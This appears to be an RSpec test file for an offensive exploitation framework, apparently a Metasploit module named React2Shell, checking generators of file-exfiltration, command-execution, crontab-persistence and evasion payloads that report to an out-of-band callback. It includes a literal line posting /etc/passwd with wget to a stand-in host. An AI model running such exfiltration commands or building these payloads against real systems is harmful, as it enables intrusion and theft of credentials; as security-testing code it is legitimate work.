# frozen_string_literal: true

require 'spec_helper'
require 'react2shell/payload_generator'
require 'react2shell/exploit_engine'

RSpec.describe 'PayloadEvasion Integration' do
  let(:msf_module) { 
    double('MSF Module', 
      datastore: { 
        'VERBOSE' => false,
        'RHOSTS' => '192.168.1.100',
        'LHOST' => '192.168.1.50',
        'SRVPORT' => 8080,
        'FILEPATH' => '/etc/passwd',
        'CMD' => 'whoami'
      },
      print_status: nil,
      print_warning: nil,
      print_error: nil,
      print_good: nil,
      vprint_status: nil,
      rhost: '192.168.1.100'
    ) 
  }

  describe 'PayloadGenerator with PayloadEvasion' do
    let(:payload_generator) { React2Shell::PayloadGenerator.new(msf_module) }
    let(:oob_url) { 'http://192.168.1.50:8080/callback' }

    it 'integrates PayloadEvasion functionality' do
      expect(payload_generator.payload_evasion).to be_a(React2Shell::PayloadEvasion)
    end

    it 'provides adaptive file exfiltration payloads' do
      filepath = '/etc/passwd'
      payloads = payload_generator.create_adaptive_file_exfiltration_payload(filepath, oob_url)
      
      expect(payloads).to be_an(Array)
      expect(payloads.length).to be > 1
      expect(payloads.first).to include('wget')
    end

    it 'provides adaptive command execution payloads' do
      command = 'whoami'
      payloads = payload_generator.create_adaptive_command_execution_payload(command, oob_url)
      
      expect(payloads).to be_an(Array)
      expect(payloads.length).to be > 1
      expect(payloads.first).to include('bash')
    end

    it 'provides persistence payloads' do
      payloads = payload_generator.create_persistence_payload(oob_url)
      
      expect(payloads).to be_an(Array)
      expect(payloads.length).to be > 1
      expect(payloads).to include(a_string_including('crontab'))
    end

    it 'applies evasion techniques' do
      payload = "wget --post-file=/etc/passwd http://example.com"
      evaded_payloads = payload_generator.apply_evasion_techniques(payload)
      
      expect(evaded_payloads).to be_an(Array)
      expect(evaded_payloads.length).to be > 1
      expect(evaded_payloads).to include(payload) # Original should be included
    end

    it 'detects environment restrictions' do
      restrictions = payload_generator.detect_environment_restrictions
      
      expect(restrictions).to be_a(Hash)
      expect(restrictions).to have_key(:available_commands)
      expect(restrictions).to have_key(:blocked_commands)
    end

    it 'creates adaptive file payload with fallback' do
      filepath = '/etc/passwd'
      
      # Test with alternatives enabled
      payload = payload_generator.create_adaptive_file_payload(filepath, oob_url, try_alternatives: true)
      expect(payload).to be_a(String)
      expect(payload).not_to be_empty
      
      # Test with alternatives disabled (should use original method)
      payload = payload_generator.create_adaptive_file_payload(filepath, oob_url, try_alternatives: false)
      expect(payload).to be_a(String)
      expect(payload).to include('wget')
    end

    it 'creates adaptive command payload with fallback' do
      command = 'whoami'
      
      # Test with alternatives enabled
      payload = payload_generator.create_adaptive_command_payload(command, oob_url, try_alternatives: true)
      expect(payload).to be_a(String)
      expect(payload).not_to be_empty
      
      # Test with alternatives disabled (should use original method)
      payload = payload_generator.create_adaptive_command_payload(command, oob_url, try_alternatives: false)
      expect(payload).to be_a(String)
      expect(payload).to include('bash')
    end
  end

  describe 'ExploitEngine with adaptive capabilities' do
    let(:config_manager) { double('ConfigurationManager') }
    let(:oob_listener) { double('OOBListener') }
    let(:session) { double('OOBSession', session_id: 'test-123') }
    let(:exploit_engine) { React2Shell::ExploitEngine.new(msf_module) }
    let(:test_oob_url) { 'http://192.168.1.50:8080/callback' }

    before do
      allow(exploit_engine.config_manager).to receive(:get_filepath).and_return('/etc/passwd')
      allow(exploit_engine.config_manager).to receive(:get_command).and_return('whoami')
      allow(exploit_engine.config_manager).to receive(:get_oob_url).and_return(test_oob_url)
      allow(exploit_engine.config_manager).to receive(:get_listener_address).and_return('192.168.1.50:8080')
      
      allow(exploit_engine.oob_listener).to receive(:start_server)
      allow(exploit_engine.oob_listener).to receive(:stop_server)
      allow(exploit_engine.oob_listener).to receive(:create_session).and_return(session)
      
      allow(exploit_engine).to receive(:send_exploit_request).and_return(double('Response', code: 200))
      allow(exploit_engine).to receive(:wait_for_session_data).and_return(true)
    end

    it 'supports adaptive exploit execution' do
      expect {
        exploit_engine.execute_adaptive_exploit(:file_exfiltration, evasion: [:case_variation])
      }.not_to raise_error
    end

    it 'falls back to original methods when adaptive fails' do
      # Mock adaptive methods to fail
      allow(exploit_engine.payload_generator).to receive(:create_adaptive_file_exfiltration_payload)
        .and_raise(StandardError, 'Adaptive failed')
      
      # Should still work with fallback
      expect {
        exploit_engine.execute_exploit(:file_exfiltration, try_alternatives: true)
      }.not_to raise_error
    end
  end
end